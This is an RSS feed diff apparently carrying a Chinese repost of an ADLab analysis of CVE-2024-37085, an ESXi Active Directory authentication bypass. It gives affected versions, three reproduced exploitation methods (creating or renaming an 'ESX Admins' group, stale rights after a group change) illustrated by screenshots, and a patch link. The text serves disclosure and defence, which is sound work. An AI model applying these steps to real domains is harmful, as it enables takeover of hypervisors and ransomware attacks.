+&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h1&gt;
+&lt;p&gt;🍘近日，微软披露了一个 ESXi 漏洞（编号为 CVE-2024-37085）的在野攻击报告 [1]。该漏洞是 VMware ESXi 的一个认证绕过漏洞，已被多个勒索软件所利用。通过该漏洞，攻击者可获取加入 AD 域的 ESXi 的完全操作权限，控制该 ESXi 中包含的虚拟机等。&lt;br&gt;
+漏洞的 NVD 描述为 [2]：VMware ESXi contains an authentication bypass vulnerability. A malicious actor with sufficient Active Directory (AD) permissions can gain full access to an ESXi host that was previously configured to use AD for user management by re-creating the configured AD group (‘ESXi Admins’ by default) after it was deleted from AD。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞影响版本&#34;&gt;#&lt;/a&gt; 漏洞影响版本&lt;/h2&gt;
+&lt;p&gt;官方发布的 ESXi 影响版本：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Version&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Running On&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi&lt;/td&gt;
+&lt;td&gt;8.0&lt;/td&gt;
+&lt;td&gt;Any&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi&lt;/td&gt;
+&lt;td&gt;7.0&lt;/td&gt;
+&lt;td&gt;Any&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;经过启明星辰 ADLab 的测试和验证，发现低版本的 ESXi 同样受影响。实测的 ESXi 影响版本&lt;br&gt;
+：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;漏洞存在性&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;存在&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;漏洞机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞机制&#34;&gt;#&lt;/a&gt; 漏洞机制&lt;/h2&gt;
+&lt;p&gt;根据官方文档的描述 [3]，为了方便管理大量 ESXi 主机，VMware ESXi 支持通过 Active Directory (AD) 来管理账号权限。其中，对于加入 AD 域的 ESXi 主机，默认设置了 AD 域 ESX Admins 用户组具有 ESXi 主机的管理员权限。因此，攻击者如果在 AD 域中能创建 ESX Admins 组或更改现有组为 ESX Admin，就能具备对加入该域的 ESXi 主机的完全控制。&lt;/p&gt;
+&lt;p&gt;微软研究人员披露了此漏洞的三种利用方式：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;创建并添加用户：创建 “ESX Admins” 组，添加用户，进而获得完全管理权限。&lt;/li&gt;
+&lt;li&gt;重命名组并添加用户：重命名现有组为 “ESX Admins”，添加用户或使用现有成员，进而获得完全管理权限。&lt;/li&gt;
+&lt;li&gt;权限刷新：在网络管理员把权限转移给 AD 域的其它组后，ESX Admins 组的管理权限不会立即消失，仍可被利用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ADLab 研究员对三种利用方法进行了复现验证。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞验证&#34;&gt;#&lt;/a&gt; 漏洞验证&lt;/h2&gt;
+&lt;p&gt;本节的漏洞验证以 ESXi6.7 为例，域控在 Server2012 服务器中，ESXi6.7 加入了该域控。&lt;/p&gt;
+&lt;h3 id=&#34;1-方法一验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-方法一验证&#34;&gt;#&lt;/a&gt; 1、方法一验证&lt;/h3&gt;
+&lt;p&gt;（1）在 ESXi 6.7 加入域控后，域控默认是没有 ESX Admins 组的，如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/640&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（2）使用 test 账户登录 ESXi（该账号目前还不在”ESX Admins” 组内）。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/74e1d492e1f11f22b24e01a1942d5072.png&#34; alt=&#34;74e1d492e1f11f22b24e01a1942d5072&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	登录失败，提示操作权限被拒绝：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b53cf5e0d9c153071145574bc7e0a4cf.png&#34; alt=&#34;b53cf5e0d9c153071145574bc7e0a4cf&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（3）使用 net group 命令，创建 1 个名为 ESX Admins 的用户组。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/8e963ed7a5d06ed6d752b7fa5ec1c36d.png&#34; alt=&#34;8e963ed7a5d06ed6d752b7fa5ec1c36d&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/d6de7d02d189544278ac5b30765d8f90.png&#34; alt=&#34;d6de7d02d189544278ac5b30765d8f90&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 net group 命令，将 test 用户加入 ESX Admins 组：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/3a9d66d3de98c60c53a3a1c9ea2c3414.png&#34; alt=&#34;3a9d66d3de98c60c53a3a1c9ea2c3414&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1be60ace68d4c52cd161bb28904221ee.png&#34; alt=&#34;1be60ace68d4c52cd161bb28904221ee&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	使用 test 用户登录，能够登录成功且能执行高权限操作：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/c7f271856e079e8166227ae7a34eafb2.png&#34; alt=&#34;c7f271856e079e8166227ae7a34eafb2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4dbba38acd842e1585ab18e6e67d93d0.png&#34; alt=&#34;4dbba38acd842e1585ab18e6e67d93d0&#34;&gt;&lt;/p&gt;
+&lt;p&gt;经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;2-方法二验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-方法二验证&#34;&gt;#&lt;/a&gt; 2、 方法二验证&lt;/h3&gt;
+&lt;p&gt;（1）在 ESXi 6.7 加入域控后，域控默认是没有 ESX Admins 组。&lt;/p&gt;
+&lt;p&gt;（2）首先，创建 1 个名为 g1 的组，把 test 用户加到 g1 组，使用 test 登录 ESXi。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/20865897feabc077a1e9ed22ccdecccc.png&#34; alt=&#34;20865897feabc077a1e9ed22ccdecccc&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/51508ba363caa31cd39907a636ddecf1.png&#34; alt=&#34;51508ba363caa31cd39907a636ddecf1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	登录失败，提示操作权限被拒绝。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/413fa97a2f7212102613dcac055ff286.png&#34; alt=&#34;413fa97a2f7212102613dcac055ff286&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（3）然后，修改 g1 的名称为 ESX Admins。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/75eb50838691c37a155c6f06ba664fb4.png&#34; alt=&#34;75eb50838691c37a155c6f06ba664fb4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（4）最后，利用 test 用户登录 ESXi。&lt;/p&gt;
+&lt;p&gt;​	登录成功，查看权限为管理员&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/be274dd5a1ae02cd12c72c33565fa1b7.png&#34; alt=&#34;be274dd5a1ae02cd12c72c33565fa1b7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;3-方法三验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-方法三验证&#34;&gt;#&lt;/a&gt; 3、方法三验证&lt;/h3&gt;
+&lt;p&gt;（1）在 ESXi 6.7 加入域控后，创建 ESX Admins 组和 g1 组，test 和 test2 分别加入 2 个组。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/e5da5caf050ecbf1ea65b559e8b33a1a.png&#34; alt=&#34;e5da5caf050ecbf1ea65b559e8b33a1a&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/56be2c204852bc6f54137d4750d686a8.png&#34; alt=&#34;56be2c204852bc6f54137d4750d686a8&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/da9a9506cc31bb6ca884b9a3966d3fdf.png&#34; alt=&#34;da9a9506cc31bb6ca884b9a3966d3fdf&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（2）登录 ESXi 尝试&lt;/p&gt;
+&lt;p&gt;​	用户 test 属于 ESX Admins 组，能够成功登录&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4b0a5ecb77d69e60a05f63ca91aaf48b.png&#34; alt=&#34;4b0a5ecb77d69e60a05f63ca91aaf48b&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	用户 test2 属于 g1 组，登录失败，提示操作权限被拒绝。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4b89328cc8c789285d80a67738a4fc20.png&#34; alt=&#34;4b89328cc8c789285d80a67738a4fc20&#34;&gt;&lt;/p&gt;
+&lt;p&gt;（3）修改 ESXi 的配置，修改默认的域管理员组为 g1。&lt;/p&gt;
+&lt;p&gt;​	用户 test2 登录，能够登录成功。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/87fbcd5169a8c4aed65a9613fd800071.png&#34; alt=&#34;87fbcd5169a8c4aed65a9613fd800071&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	用户 test 登录，仍然能登录成功。尽管，此时 test 用户实际已经不属于 ESXi 配置的域管理员组。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/10aad9f69bd9393fbc146781346b19f1.png&#34; alt=&#34;10aad9f69bd9393fbc146781346b19f1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 8.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 7.0&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 6.7&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ESXi 5.5&lt;/td&gt;
+&lt;td&gt;是&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h2&gt;
+&lt;p&gt;​	博通官方给了相关修复版本的 ESXi 下载链接和文档，将 ESXi 升级到最新的修复版本即可，补丁下载地址：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&#34;&gt;https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/security-advisories/0/24505&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文章转自启明星辰-adlabvmware-esxi-cve-2024-37085漏洞验证分析-qqcom&#34;&gt;#&lt;/a&gt; 文章转自启明星辰 [ADLab]：&lt;a href=&#34;https://mp.weixin.qq.com/s/IVgEogcJigvPCq5MI9eeyg&#34;&gt;VMware ESXi CVE-2024-37085 漏洞验证分析 (qq.com)&lt;/a&gt;&lt;/h3&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
